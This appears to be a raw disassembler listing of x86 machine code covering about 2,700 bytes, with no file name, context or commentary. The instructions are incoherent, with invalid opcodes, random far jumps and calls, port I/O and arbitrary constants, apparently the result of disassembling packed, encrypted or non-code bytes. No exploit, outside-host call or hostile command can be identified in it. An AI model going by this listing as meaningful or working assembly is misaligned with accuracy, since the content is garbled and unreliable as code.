  4283b3:	and    DWORD PTR [esi+0x6b5f928a],esp
  4283b9:	jno    0x428397
  4283bb:	loope  0x428373
  4283bd:	and    eax,0x95534ac1
  4283c2:	mov    edx,0x18558540
  4283c7:	rcr    BYTE PTR [ecx-0x12828c1b],0xb0
  4283ce:	dec    eax
  4283cf:	int3   
  4283d0:	aaa    
  4283d1:	mov    dh,0xef
  4283d3:	repz mov esp,0x62095e5b
  4283d9:	or     al,0xe4
  4283db:	addr16 jmp 0x7583bbcb
  4283e1:	inc    eax
  4283e2:	mov    esi,0x6ee66511
  4283e7:	sar    DWORD PTR [edi-0x5d183981],1
  4283ed:	js     0x42844b
  4283ef:	nop
  4283f0:	jmp    FWORD PTR [ecx+0x7fe7ef56]
  4283f6:	int    0x55
  4283f8:	adc    DWORD PTR [edx-0x10fb2e4],ecx
  4283fe:	sbb    ah,BYTE PTR [eax]
  428400:	inc    edx
  428401:	mov    al,ds:0x5fbc7da9
  428406:	mov    ch,0xe2
  428408:	mov    WORD PTR [eax+0x3d],?
  42840b:	inc    BYTE PTR [esi]
  42840d:	or     eax,0xc035e5
	...
  428472:	add    BYTE PTR [eax],al
  428474:	push   cs
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x93abfb32
  428481:	sti    
  428482:	mov    dl,0x47
  428484:	sbb    DWORD PTR [edi+0x1050001],ebp
  42848a:	add    BYTE PTR [eax],al
  42848c:	sbb    eax,0xe7affe53
  428491:	mov    edx,0xb6e2d06
  428496:	pop    eax
  428497:	pop    es
  428498:	fcomi  st,st(5)
  42849a:	mov    ebp,DWORD PTR [edi-0x79]
  42849d:	fsubr  DWORD PTR [eax*4+0x5b503cf1]
  4284a4:	adc    DWORD PTR [edx],0xe7f40d7f
  4284aa:	retf   0xb285
  4284ad:	dec    esp
  4284ae:	and    DWORD PTR [ecx],edx
  4284b0:	ret    0x40d9
  4284b3:	and    al,0xf5
  4284b5:	dec    esi
  4284b6:	mov    ?,ebp
  4284b8:	cmp    DWORD PTR [edx+0x9],ebx
  4284bb:	pop    ecx
  4284bc:	add    DWORD PTR [edx],eax
  4284be:	ss loope 0x428473
  4284c1:	nop
  4284c2:	add    eax,0x6c54d44a
  4284c7:	push   ecx
  4284c8:	inc    esi
  4284c9:	mov    ch,0x98
  4284cb:	in     eax,0x26
  4284cd:	mov    eax,edi
  4284cf:	and    dl,BYTE PTR [esi+esi*1+0x79c2ed1e]
  4284d6:	(bad)  
  4284d7:	mov    eax,ds:0x98aa76ac
  4284dc:	inc    ebx
  4284dd:	or     ch,BYTE PTR [eax]
  4284df:	sbb    BYTE PTR [esp+ecx*8],bh
  4284e2:	push   DWORD PTR [edx+0x68ab5b05]
  4284e8:	mov    ds:0xd1342281,eax
  4284ed:	int    0xd
  4284ef:	pop    ss
  4284f0:	cmp    BYTE PTR [ebp+eiz*2+0x4dd567a8],al
  4284f7:	push   esp
  4284f8:	push   cs
  4284f9:	adc    DWORD PTR [ebp+0x21],esp
  4284fc:	punpckhdq mm6,QWORD PTR ds:[ecx-0x46]
  428501:	or     al,0xe5
  428503:	shl    dl,0xee
  428506:	cli    
  428507:	repz inc ebx
  428509:	sar    ebx,0x68
  42850c:	dec    esp
  42850d:	and    esi,DWORD PTR [ecx+0x1c]
  428510:	shr    BYTE PTR [ebp+edx*4+0x77],0x1c
  428515:	sub    cl,BYTE PTR [ecx-0x2]
  428518:	pop    ss
  428519:	and    eax,0xda08e87e
  42851e:	pmuludq mm3,QWORD PTR [ebp-0x6f6f6e5f]
  428525:	pop    eax
  428526:	pop    ebx
  428527:	jae    0x42852f
  428529:	scas   eax,DWORD PTR es:[edi]
  42852a:	cmc    
  42852b:	inc    eax
  42852c:	pop    ds
  42852d:	jmp    0xc0b488b9
  428532:	(bad)  [edx+0x7309ef70]
  428538:	mov    dl,0xa0
  42853a:	or     ebx,DWORD PTR [edx+esi*8+0x76]
  42853e:	xor    eax,0x9c2a3e8f
  428543:	mov    dl,0x40
  428545:	js     0x428512
  428547:	arpl   bx,si
  428549:	test   al,0x4d
  42854b:	mov    edi,0xcfa28f5f
  428550:	retf   0x7a5f
  428553:	call   0xa830d88
  428558:	jle    0x428521
  42855a:	sbb    DWORD PTR [eax],ecx
  42855c:	sbb    DWORD PTR [eax],ebp
  42855e:	pop    esp
  42855f:	and    al,0xf0
  428561:	xchg   BYTE PTR [edx+0x1e],bl
  428564:	(bad)  
  428565:	jne    0x42857a
  428567:	call   0x6181:0x643fdf62
  42856e:	sbb    ebx,DWORD PTR [edi-0x43]
  428571:	cmp    BYTE PTR [edi-0x6dd05cf5],bh
  428577:	sbb    esi,DWORD PTR [edx+0x60]
  42857a:	iret   
  42857b:	in     eax,0x58
  42857d:	push   eax
  42857e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42857f:	jne    0x4285a1
  428581:	aam    0xd
  428583:	je     0x42851a
  428585:	add    DWORD PTR [eax],ebp
  428587:	js     0x42852a
  428589:	xchg   edx,eax
  42858a:	sbb    eax,ebx
  42858c:	adc    al,bh
  42858e:	push   0xffffffd4
  428590:	retf   
	...
  4285f1:	add    BYTE PTR [eax],al
  4285f3:	add    BYTE PTR [ecx-0xa],dl
  4285f6:	xor    eax,0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0xda24a3f6
  428602:	popa   
  428603:	mov    ebx,DWORD PTR [esi]
  428605:	mov    al,0x1
  428607:	add    BYTE PTR ds:0xeb000001,al
  42860d:	ret    
  42860e:	or     esp,DWORD PTR ds:0x9b76429e
  428614:	test   DWORD PTR [edi-0x54],esp
  428617:	push   ecx
  428618:	sub    BYTE PTR [edx],ah
  42861a:	push   edi
  42861b:	(bad)  
  42861c:	push   esp
  42861d:	hlt    
  42861e:	enter  0x2dcd,0xbf
  428622:	xor    dh,ah
  428624:	push   es
  428625:	mov    bh,0x13
  428627:	fcmovnbe st,st(0)
  428629:	mov    bl,0xc8
  42862b:	stos   DWORD PTR es:[edi],eax
  42862c:	jecxz  0x4286a6
  42862e:	(bad)  
  42862f:	pop    ss
  428630:	mov    DWORD PTR [edx+ebx*2],esi
  428633:	aad    0xa8
  428635:	cli    
  428636:	xlat   BYTE PTR ds:[ebx]
  428637:	test   DWORD PTR [eax+eax*2-0x3d3dcac3],esi
  42863e:	call   0x294f:0x17b6a028
  428645:	and    eax,0xc477a2f4
  42864a:	jbe    0x42862f
  42864c:	stos   DWORD PTR es:[edi],eax
  42864d:	sub    BYTE PTR [edx-0x5f512b73],bl
  428653:	stos   DWORD PTR es:[edi],eax
  428654:	loopne 0x4285d9
  428656:	inc    ebp
  428657:	call   ebx
  428659:	and    al,0x36
  42865b:	es mov bh,dl
  42865e:	fimul  DWORD PTR [ecx]
  428660:	push   ebx
  428661:	xor    al,0x74
  428663:	dec    esp
  428664:	shr    BYTE PTR [ebx+0x6b811392],cl
  42866a:	and    al,0x9c
  42866c:	pop    esp
  42866d:	push   ds
  42866e:	and    esp,DWORD PTR [edx+edx*1+0xd6ecad6]
  428675:	dec    ebx
  428676:	xor    eax,edi
  428678:	mov    dl,0x5
  42867b:	imul   eax,DWORD PTR [ecx],0xffffff89
  42867e:	aam    0x72
  428680:	fs mov ch,ah
  428683:	test   DWORD PTR [ecx+edx*2-0x32],eax
  428687:	mov    ch,0x42
  428689:	loop   0x42863e
  42868b:	or     BYTE PTR [ebp-0x2f],cl
  42868e:	call   0x1b0f:0x9c558fbd
  428695:	pop    eax
  428696:	aas    
  428697:	ror    BYTE PTR [ebp+0x7ec8bc6f],cl
  42869d:	out    0x59,eax
  42869f:	sbb    DWORD PTR [esi],esp
  4286a1:	mov    BYTE PTR [ecx],cl
  4286a3:	test   bl,0x89
  4286a6:	mov    bh,0x7a
  4286a8:	push   ds
  4286a9:	dec    esp
  4286aa:	data16 outs dx,BYTE PTR ds:[esi]
  4286ac:	std    
  4286ad:	xchg   esp,eax
  4286ae:	mul    DWORD PTR [esp+0x3ff33827]
  4286b5:	xor    DWORD PTR [eax],0xfb74809a
  4286bb:	stos   DWORD PTR es:[edi],eax
  4286bc:	sbb    eax,0xc57c6143
  4286c1:	ins    BYTE PTR es:[edi],dx
  4286c2:	mov    edx,0x40463b53
  4286c7:	lock scas eax,DWORD PTR es:[edi]
  4286c9:	xchg   ebp,eax
  4286ca:	mov    esi,0x3723670f
  4286cf:	pop    esi
  4286d0:	jne    0x42871e
  4286d2:	xlat   BYTE PTR ds:[ebx]
  4286d3:	sub    BYTE PTR [edi+0x94d605a],dh
  4286d9:	repz out 0x4e,al
  4286dc:	mov    edx,esi
  4286de:	jl     0x428710
  4286e0:	push   es
  4286e1:	xchg   DWORD PTR ds:0xcbeeec86,ebx
  4286e7:	dec    edx
  4286e8:	or     edx,DWORD PTR [edi+edi*8-0x1147f7f8]
  4286ef:	in     eax,dx
  4286f0:	mov    esi,0x2e49d612
  4286f5:	test   DWORD PTR [edi+0x5c684812],esi
  4286fb:	cvttps2pi mm2,QWORD PTR [edx]
  4286fe:	outs   dx,BYTE PTR ds:[esi]
  4286ff:	xchg   esp,eax
  428700:	icebp  
  428701:	iret   
  428702:	jg     0x42871a
  428704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428705:	dec    eax
  428706:	vandpd ymm5,ymm4,YMMWORD PTR [edi]
  42870a:	addr16 sub eax,0x9e631b1
  428710:	jb     0x428712
	...
  428772:	add    BYTE PTR [eax],al
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x713cee96
  428783:	pop    es
  428784:	and    esi,DWORD PTR [ecx+0x1050001]
  42878a:	add    BYTE PTR [eax],al
  42878c:	dec    eax
  42878d:	push   0x75
  42878f:	mul    BYTE PTR [ecx+0x6f7caf76]
  428795:	pop    ebx
  428796:	outs   dx,BYTE PTR ds:[esi]
  428797:	scas   al,BYTE PTR es:[edi]
  428798:	dec    ebx
  428799:	lods   eax,DWORD PTR ds:[esi]
  42879a:	repz int 0xa9
  42879d:	jbe    0x428804
  42879f:	fsub   DWORD PTR [edx-0x1c]
  4287a2:	or     eax,ebx
  4287a4:	xor    eax,0x34cbef8e
  4287a9:	bts    DWORD PTR [esi+0x7d],ebp
  4287ad:	int3   
  4287ae:	aad    0x37
  4287b0:	retf   0xa611
  4287b3:	popa   
  4287b4:	sub    BYTE PTR [edx-0x29],dh
  4287b7:	jno    0x428769
  4287b9:	leave  
  4287ba:	jmp    0xa420:0xbfe8f6b9
  4287c1:	stos   BYTE PTR es:[edi],al
  4287c2:	inc    ecx
  4287c3:	mov    bl,0xa1
  4287c5:	add    DWORD PTR [ecx-0x55],ebx
  4287c8:	push   edi
  4287c9:	lods   al,BYTE PTR ds:[esi]
  4287ca:	cmp    al,0x33
  4287cc:	jg     0x428823
  4287ce:	mov    bh,0x91
  4287d0:	dec    ebp
  4287d1:	dec    esp
  4287d2:	lea    ebp,[edx-0x2d]
  4287d5:	in     eax,dx
  4287d6:	mov    eax,ds:0x99f97ab3
  4287db:	imul   ebp,edi,0x7254f6a5
  4287e1:	xchg   edi,eax
  4287e2:	jb     0x42878b
  4287e4:	sbb    al,0x3c
  4287e6:	(bad)  [edi-0x56f311cd]
  4287ec:	mov    edi,0x7650197c
  4287f1:	shl    BYTE PTR [ecx+0x4],cl
  4287f4:	add    al,0x46
  4287f6:	cwde   
  4287f7:	dec    esp
  4287f8:	pop    ds
  4287f9:	xor    al,0xdf
  4287fb:	pop    es
  4287fc:	outs   dx,DWORD PTR ds:[esi]
  4287fd:	mov    edi,es
  4287ff:	imul   esi,DWORD PTR [esi+0x1d985eb0],0xd
  428806:	mov    cl,BYTE PTR [edi+0x6f]
  428809:	sbb    al,0x33
  42880b:	jp     0x42880e
  42880d:	jns    0x42879d
  42880f:	add    eax,DWORD PTR [edx+eax*2+0x603ef4db]
  428816:	jge    0x428871
  428818:	adc    ah,BYTE PTR [ebx+esi*4]
  42881b:	and    esp,DWORD PTR [ecx-0x25]
  42881e:	cmp    BYTE PTR [ecx],ah
  428820:	inc    esi
  428821:	cmc    
  428822:	js     0x4287d3
  428824:	xchg   DWORD PTR [esi+0x87d5ec9],ecx
  42882a:	mov    dh,0x83
  42882c:	imul   ecx,DWORD PTR [ebp-0x773a1df6],0xffffffab
  428833:	mov    dh,cl
  428835:	jnp    0x4287dc
  428837:	stos   BYTE PTR es:[edi],al
  428838:	sbb    edx,esi
  42883a:	adc    eax,0x62f4c3e2
  42883f:	or     al,0xa5
  428841:	and    al,BYTE PTR [ecx+0x32c44a93]
  428847:	cmp    esp,DWORD PTR [ebx-0xc]
  42884a:	jp     0x4288bf
  42884c:	ins    DWORD PTR es:[edi],dx
  42884d:	mov    ch,0x3e
  42884f:	retf   
  428850:	fiadd  DWORD PTR [edx]
  428852:	push   edx
  428853:	xor    BYTE PTR [edi+ecx*2-0x2f5da497],ch
  42885a:	cmp    BYTE PTR [ebp-0x25a9af02],0xe
  428861:	ss push esi
  428863:	out    dx,al
  428864:	push   ebp
  428865:	or     eax,0xafb2076f
  42886a:	push   cs
  42886b:	outs   dx,BYTE PTR ds:[esi]
  42886c:	mov    eax,ds:0xc31ce4aa
  428871:	mov    edx,0xdeb10f92
  428876:	loopne 0x428819
  428878:	lahf   
  428879:	fs push ss
  42887b:	ds xchg edi,eax
  42887d:	inc    esi
  42887e:	inc    esi
  42887f:	sbb    BYTE PTR [eax],bl
  428881:	test   al,0x26
  428883:	inc    eax
  428884:	or     al,0xf2
  428886:	xchg   ebx,eax
  428887:	mov    cl,0x63
  428889:	out    0xf2,al
  42888b:	inc    eax
  42888c:	hlt    
  42888d:	in     eax,0x86
  42888f:	sahf   
  428890:	ins    BYTE PTR es:[edi],dx
	...
  4288f1:	add    BYTE PTR [eax],al
  4288f3:	add    BYTE PTR [esi],ah
  4288f5:	jp     0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi-0x158562f1],bx
  428902:	aad    0x8f
  428904:	sub    BYTE PTR [edx+0x1050001],dh
  42890a:	add    BYTE PTR [eax],al
  42890c:	mov    dh,0x66
  42890e:	and    DWORD PTR [ebx+0x5a9c95fe],ebp
  428914:	leave  
  428915:	pop    ss
  428916:	cmp    BYTE PTR [edi],bh
  428918:	xor    ebp,eax
  42891a:	dec    ebp
  42891b:	or     BYTE PTR [eax],0x51
  42891e:	out    0xbd,eax
  428920:	dec    esp
  428921:	inc    eax
  428922:	ret    0xaa8b
  428925:	jmp    0x42897e
  428927:	mov    dh,0xec
  428929:	push   0xefad7a3c
  42892e:	pop    esi
  42892f:	xchg   esp,eax
  428930:	stos   BYTE PTR es:[edi],al
  428931:	push   esi
  428932:	test   BYTE PTR [edi],0x56
  428935:	ins    DWORD PTR es:[edi],dx
  428936:	js     0x4289b4
  428938:	data16 je 0x428905
  42893b:	sub    DWORD PTR [ebx-0x5f],esp
  42893e:	mov    ebx,0x2b48ba29
  428943:	and    al,0x62
  428945:	psrld  mm1,QWORD PTR [eax+eax*8+0x3e3fb5a6]
  42894d:	mov    ds:0x40263a08,al
  428952:	in     eax,0x59
  428954:	and    eax,0x2aa6bc1c
  428959:	pop    esi
  42895a:	jbe    0x428950
  42895c:	lods   eax,DWORD PTR ds:[esi]
  42895d:	es cdq 
  42895f:	test   al,0xde
  428962:	sbb    dl,ch
  428964:	js     0x4289d2
  428966:	rol    ebp,1
  428968:	pop    ds
  428969:	mov    esp,0xd61917d3
  42896e:	out    0x5a,eax
  428970:	xor    BYTE PTR [esi],0x26
  428973:	adc    eax,0xc141aefd
  428978:	mov    bl,0x4f
  42897a:	nop
  42897b:	mov    BYTE PTR [edi+0x72b58f9c],ah
  428981:	into   
  428982:	xor    eax,0x72962bf9
  428987:	stos   BYTE PTR es:[edi],al
  428988:	xor    DWORD PTR ds:0xb8622ea8,ecx
  42898e:	inc    esi
  42898f:	sub    BYTE PTR [ebx-0x7bf4e639],cl
  428995:	je     0x428936
  428997:	mov    eax,ds:0xceb07691
  42899c:	xor    bh,BYTE PTR [ebp+0x5c]
  42899f:	adc    eax,0x592e8b9d
  4289a4:	das    
  4289a5:	add    al,0xcd
  4289a7:	inc    edx
  4289a8:	ins    BYTE PTR es:[edi],dx
  4289a9:	aas    
  4289aa:	je     0x42895a
  4289ac:	bound  ecx,QWORD PTR [ebp+0x2368168]
  4289b2:	sub    al,ah
  4289b4:	push   cs
  4289b5:	fstp   QWORD PTR [eax-0x4a]
  4289b8:	fld    st(2)
  4289ba:	in     al,dx
  4289bb:	in     eax,0xb6
  4289bd:	jmp    0x42894f
  4289bf:	or     BYTE PTR [eax],dh
  4289c1:	mov    bl,0xa2
  4289c3:	test   BYTE PTR [ebx+0x1a4874e],0x99
  4289ca:	mov    ecx,0x62c4d9a
  4289cf:	mov    es,WORD PTR [edx-0x1f0dda1a]
  4289d5:	mov    BYTE PTR ds:0x648b2dd4,dl
  4289db:	aad    0xe4
  4289dd:	lahf   
  4289de:	xlat   BYTE PTR ds:[ebx]
  4289df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4289e1:	sbb    al,cl
  4289e3:	fnstenv [ebx-0x55dfc707]
  4289e9:	add    DWORD PTR [edx],ecx
  4289eb:	pop    edx
  4289ec:	cwde   
  4289ed:	cwde   
  4289ee:	adc    edi,DWORD PTR [ebp+0x74]
  4289f1:	aam    0x6d
  4289f3:	in     al,dx
  4289f4:	jmp    0x428978
  4289f6:	sbb    eax,0x18480833
  4289fb:	pop    ebx
  4289fc:	sub    BYTE PTR [eax+0x14],ah
  4289ff:	sbb    esp,DWORD PTR [eax+0x37]
  428a02:	mov    fs,edi
  428a04:	dec    ebx
  428a05:	sub    eax,0x2f100871
  428a0a:	out    0x49,al
  428a0c:	popa   
  428a0d:	loopne 0x428a4b
  428a0f:	add    al,BYTE PTR fs:[eax]
	...
  428a72:	add    BYTE PTR [eax],al
  428a74:	dec    ebp
  428a75:	or     al,0xf8
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax-0x47de84ed]
  428a83:	daa    
  428a84:	sub    eax,0x50001b3
  428a89:	add    DWORD PTR [eax],eax
  428a8b:	add    BYTE PTR [esi-0x1eeaa63a],dh
  428a91:	mov    DWORD PTR [esi+0x189e9200],ebp
  428a97:	fwait
  428a98:	daa    
  428a99:	bound  edx,QWORD PTR [ebp+0x8]
  428a9c:	das    
  428a9d:	test   eax,0x543551d2
  428aa2:	or     bh,BYTE PTR [ebx-0x17]
  428aa5:	jo     0x428a4a
  428aa7:	adc    bl,BYTE PTR fs:[ecx]
  428aaa:	pop    ecx
  428aab:	add    DWORD PTR [edi-0x7c],0x5d
  428aaf:	cmp    eax,0x44637702
  428ab4:	pushw  0x909e
  428ab8:	adc    dl,BYTE PTR [esi+0x6491966f]
  428abe:	je     0x428a9f
  428ac0:	out    0xc0,eax
  428ac2:	xchg   esp,eax
  428ac3:	mov    ebp,0x14bccb3d
  428ac8:	jmp    0x4a6c:0x6c35d2c2
  428acf:	pusha  
  428ad0:	jmp    0xf128:0xf9fbfb64
  428ad7:	sbb    DWORD PTR [edx-0x6e9e4dd1],esi
  428add:	ss jnp 0x428b3d
  428ae0:	fidivr DWORD PTR [edx+0x1697bfdc]
  428ae6:	inc    edi
  428ae7:	jg     0x428b4f
  428ae9:	push   ecx
  428aea:	retf   0xd546
  428aed:	jecxz  0x428b5b
  428aef:	cdq    
  428af0:	ficomp WORD PTR [edx-0x6a]
  428af3:	sub    al,0x8d
  428af5:	jecxz  0x428a82
  428af7:	push   ds
  428af8:	aad    0x5b
  428afa:	aas    
  428afb:	ret    0x7214
  428afe:	mov    eax,0x335343db
  428b03:	sti    
  428b04:	jbe    0x428ac3
  428b06:	inc    eax
  428b07:	mov    esp,DWORD PTR [ebx]
  428b09:	xor    BYTE PTR [eax-0x67d9bec2],al
  428b0f:	or     al,0xa1
  428b11:	inc    ecx
  428b12:	nop
  428b13:	mov    ebx,0x1f9ffad4
  428b18:	imul   esi,DWORD PTR [eax],0x51
  428b1b:	push   cs
  428b1c:	ss inc ebp
  428b1e:	fsubr  QWORD PTR [edx-0x2ebc3e32]
  428b24:	inc    ecx
  428b25:	xchg   ebx,eax
  428b26:	stos   DWORD PTR es:[edi],eax
  428b27:	mov    dl,0x39
  428b29:	adc    dl,ah
  428b2b:	ror    DWORD PTR [ecx],0xbf
  428b2e:	aaa    
  428b2f:	std    
  428b30:	cmp    BYTE PTR [esi-0x6],0x9a
  428b34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428b35:	jl     0x428ac0
  428b37:	inc    esi
  428b38:	fcomp  QWORD PTR [edx-0x76a8cefb]
  428b3e:	mov    edi,0x56c063d4
  428b43:	not    BYTE PTR [edx-0x5]
  428b46:	out    0x8f,eax
  428b48:	shl    BYTE PTR [edx-0xb],0x62
  428b4c:	test   eax,0xe3de1ea1
  428b51:	scas   al,BYTE PTR es:[edi]
  428b52:	call   0x95f7c877
  428b57:	sti    
  428b58:	and    BYTE PTR [ecx+0x44],bl
  428b5b:	loop   0x428b65
  428b5d:	in     al,0xae
  428b5f:	pop    ds
  428b60:	(bad)  
  428b61:	mov    ah,0x96
  428b63:	cmp    bl,bh
  428b65:	es xchg ecx,eax
  428b67:	adc    ah,BYTE PTR [ebp-0x460bdf81]
  428b6d:	fisttp DWORD PTR [ebx-0x77ecfd47]
  428b73:	hlt    
  428b74:	fcomip st,st(2)
  428b76:	or     DWORD PTR [edx+eiz*1-0x80],eax
  428b7a:	pop    edi
  428b7b:	ror    esi,0x13
  428b7e:	mov    DWORD PTR [eax],0xa1e239ec
  428b84:	mov    ds:0x3076d4ac,al
  428b89:	pop    DWORD PTR [ebx]
  428b8b:	inc    edi
  428b8c:	mov    esi,0xcfc05b58
	...
  428bf1:	add    BYTE PTR [eax],al
  428bf3:	add    ch,al
  428bf5:	push   ebp
  428bf6:	mov    bh,dl
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0xfbd7cd5f
  428c04:	xor    dh,BYTE PTR [ecx+eax*1+0x10500]
  428c0b:	add    BYTE PTR [ebx],ah
  428c0d:	stos   DWORD PTR es:[edi],eax
  428c0e:	cmp    DWORD PTR [eax],ecx
  428c10:	lds    ebp,FWORD PTR [eax+0x1b8e242c]
  428c16:	in     eax,dx
  428c17:	add    dl,dh
  428c19:	and    DWORD PTR [ecx+0x38],ebp
  428c1c:	jb     0x428bf7
  428c1e:	sub    cl,BYTE PTR [esi-0x2]
  428c21:	dec    esi
  428c22:	dec    esp
  428c23:	fidiv  DWORD PTR [ebp+0x24]
  428c26:	add    bl,bl
  428c28:	xchg   DWORD PTR cs:[esi-0x18b2bcd4],ebp
  428c2f:	mov    ebp,0x420cf6d9
  428c34:	pop    ss
  428c35:	scas   al,BYTE PTR es:[edi]
  428c36:	inc    ecx
  428c37:	or     BYTE PTR [esi+0x4eb4fc6c],0x59
  428c3e:	cmp    al,0xdb
  428c40:	xchg   edx,eax
  428c41:	fwait
  428c42:	arpl   WORD PTR [edx],ax
  428c44:	xchg   DWORD PTR [ecx],edx
  428c46:	mov    BYTE PTR [ebp+0x20],dl
  428c49:	and    bl,cl
  428c4b:	test   bl,dh
  428c4d:	inc    eax
  428c4e:	and    al,0x70
  428c50:	sbb    edx,DWORD PTR ds:0x19f847e
  428c56:	icebp  
  428c57:	stos   BYTE PTR es:[edi],al
  428c58:	shl    DWORD PTR [ecx+0x27029858],cl
  428c5e:	mov    eax,eax
  428c60:	inc    ebx
  428c61:	jns    0x428cc9
  428c63:	mov    dh,0xa5
  428c65:	into   
  428c66:	jno    0x428c81
  428c68:	mov    esp,0x7bda6a2e
  428c6d:	cmp    ebx,DWORD PTR [edi+0x62]
  428c70:	dec    ebp
  428c71:	xor    al,0x46
  428c73:	jecxz  0x428c5d
  428c75:	inc    ebx
  428c76:	pop    edi
  428c77:	push   ebp
  428c78:	jb     0x428c07
  428c7a:	nop
  428c7b:	xor    ah,BYTE PTR [edi+0x1584b09c]
  428c81:	std    
  428c82:	mov    esp,0x27d727d1
  428c87:	lea    ebx,[edx+ebx*1-0x29]
  428c8b:	lods   eax,DWORD PTR ds:[esi]
  428c8c:	add    ah,BYTE PTR [edi+0x7e]
  428c8f:	psraw  mm1,mm2
  428c92:	xor    DWORD PTR [esi+0x108a4640],edx
  428c98:	mov    cl,0x42
  428c9a:	inc    ebx
  428c9b:	dec    ecx
  428c9c:	mov    ebp,fs
  428c9e:	sar    BYTE PTR ss:[ecx-0x699e360d],1
  428ca5:	ret    0x9a95
  428ca8:	leave  
  428ca9:	fld    QWORD PTR [eax+0x2f]
  428cac:	clc    
  428cad:	xchg   esi,eax
  428cae:	xchg   ebp,eax
  428caf:	xchg   esp,eax
  428cb0:	inc    edi
  428cb1:	fcmove st,st(3)
  428cb3:	lea    ecx,[ebp-0x51]
  428cb6:	and    ebp,ecx
  428cb8:	(bad)  
  428cb9:	or     ah,BYTE PTR [esi-0x8a4b6af]
  428cbf:	cld    
  428cc0:	ret    
  428cc1:	int3   
  428cc2:	jg     0x428ce2
  428cc4:	arpl   si,cx
  428cc6:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  428cc8:	push   ebx
  428cc9:	call   0x23bd:0x4b43ebed
  428cd0:	cmp    eax,0x1d3f396b
  428cd5:	ror    DWORD PTR [edi+edx*4+0x3],cl
  428cd9:	loop   0x428cb0
  428cdb:	push   esi
  428cdc:	leave  
  428cdd:	xor    esp,DWORD PTR [edi-0x32]
  428ce0:	or     dl,BYTE PTR [edi+0x7c]
  428ce3:	jno    0x428c7d
  428ce5:	jle    0x428cff
  428ce7:	aad    0x18
  428ce9:	jne    0x428d35
  428ceb:	clc    
  428cec:	cmp    dh,BYTE PTR [esi+0x3625943d]
  428cf2:	jo     0x428d41
  428cf4:	cs rol edx,cl
  428cf7:	not    ebp
  428cf9:	(bad)  
  428cfa:	mov    dl,0x90
  428cfc:	loop   0x428d30
  428cfe:	(bad)  
  428cff:	in     eax,0x3f
  428d01:	adc    al,bh
  428d03:	mov    ecx,0xfa4e773a
  428d08:	or     eax,0x16ef6508
  428d0d:	mov    eax,0xd4a06f
	...
  428d72:	add    BYTE PTR [eax],al
  428d74:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0x2736
  428d82:	push   ebp
  428d83:	xchg   esi,eax
  428d84:	aaa    
  428d85:	mov    ch,0x1
  428d87:	add    BYTE PTR ds:0xdf000001,al
  428d8d:	or     ebx,edx
  428d8f:	shl    DWORD PTR [esi],0x96
  428d92:	dec    ebp
  428d93:	psllq  mm0,mm7
  428d96:	pop    ecx
  428d97:	enter  0x5d5c,0x4
  428d9b:	inc    ebx
  428d9c:	stos   BYTE PTR es:[edi],al
  428d9d:	sbb    ebp,DWORD PTR [edx-0x92c7e03]
  428da3:	mov    esp,0x64111714
  428da8:	mov    ebx,0x28d156a8
  428dad:	sub    BYTE PTR [ebp-0x37],0xff
  428db1:	(bad)  
  428db2:	fwait
  428db3:	sbb    ebx,edi
  428db5:	out    dx,al
  428db6:	imul   edx,esi,0xbd645446
  428dbc:	popa   
  428dbd:	fwait
  428dbe:	ins    DWORD PTR es:[edi],dx
  428dbf:	fwait
  428dc0:	pop    esi
  428dc1:	add    al,0x6c
  428dc3:	mov    eax,0xaafae1c4
  428dc8:	scas   eax,DWORD PTR es:[edi]
  428dc9:	add    cl,BYTE PTR [edx+eax*1]
  428dcc:	fwait
  428dcd:	or     dl,BYTE PTR [ebx]
  428dcf:	ror    BYTE PTR [eax+0x729f57b7],0xb6
  428dd6:	mov    edi,fs
  428dd8:	add    dh,ch
  428dda:	arpl   WORD PTR [esi+0x60495668],si
  428de0:	add    dl,BYTE PTR [esi]
  428de2:	test   BYTE PTR [eax],al
  428de4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428de5:	jg     0x428daf
  428de7:	xchg   ebp,eax
  428de8:	mov    ch,0xa7
  428dea:	fwait
  428deb:	xchg   esp,eax
  428dec:	les    edx,FWORD PTR [ebx]
  428dee:	inc    ebp
  428def:	mov    ebx,0xdcde7fd5
  428df4:	sub    BYTE PTR [edi],bh
  428df6:	in     al,0x56
  428df8:	xchg   DWORD PTR [edx],ebx
  428dfa:	cmp    DWORD PTR [ebx+0x79],0xa5e84967
  428e01:	and    eax,0xfd09b151
  428e06:	cmp    eax,DWORD PTR [ebp+eax*8-0x6bafec05]
  428e0d:	(bad)  
  428e0e:	jb     0x428e35
  428e10:	mov    ah,0x7a
  428e12:	pop    esi
  428e13:	xchg   esi,eax
  428e14:	push   0x8e319866
  428e19:	cwde   
  428e1a:	sub    eax,DWORD PTR [ebx+0x46feae97]
  428e20:	sbb    esi,DWORD PTR [edi+0x13681fb0]
  428e26:	inc    eax
  428e27:	test   al,0xe6
  428e29:	jle    0x428e8a
  428e2b:	ds retf 0x4810
  428e2f:	int    0x1b
  428e31:	sbb    ah,dh
  428e33:	pushf  
  428e34:	jmp    0xd1be5f32
  428e39:	jno    0x428de9
  428e3b:	inc    edi
  428e3c:	jecxz  0x428e4e
  428e3e:	test   eax,0x58f9c86d
  428e43:	sahf   
  428e44:	(bad)  
  428e45:	mov    edx,cs
  428e47:	rcl    BYTE PTR [ecx+0x41339282],1
  428e4d:	lds    esi,FWORD PTR [edi-0x1e]
  428e50:	pushf  
  428e51:	shr    BYTE PTR [esi+edi*4],cl
